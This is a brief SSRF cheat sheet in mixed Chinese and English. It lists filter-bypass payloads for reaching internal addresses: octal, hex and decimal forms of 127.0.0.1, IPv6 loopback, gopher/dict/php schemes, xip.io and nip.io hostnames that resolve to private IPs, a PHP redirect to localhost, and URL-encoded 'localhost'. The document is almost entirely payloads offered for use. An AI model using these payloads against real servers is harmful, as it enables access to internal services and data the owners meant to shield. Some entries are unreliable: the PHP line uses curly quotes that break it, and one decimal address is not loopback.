## SSRF

---

**基本 payload**
```
http://0177.1/
http://0x7f.1/
http://127.000.000.1
https://520968996
```

_Note:_ The latter can be calculated using http://www.subnetmask.info/

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
http://[::]
```

**DNS 欺骗**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```
_Link:_ http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Link:_ http://nip.io

**重定向欺骗**
```
<?php header(“location: http://127.0.0.1"); ?>
```

**编码绕过**

这些包括十六进制编码，八进制编码，双字编码，URL编码和混合编码。

```
127.0.0.1 translates to 0x7f.0x0.0x0.0x1
127.0.0.1 translates to 0177.0.0.01
http://127.0.0.1 translates to http://2130706433
localhost translates to %6c%6f%63%61%6c%68%6f%73%74
```
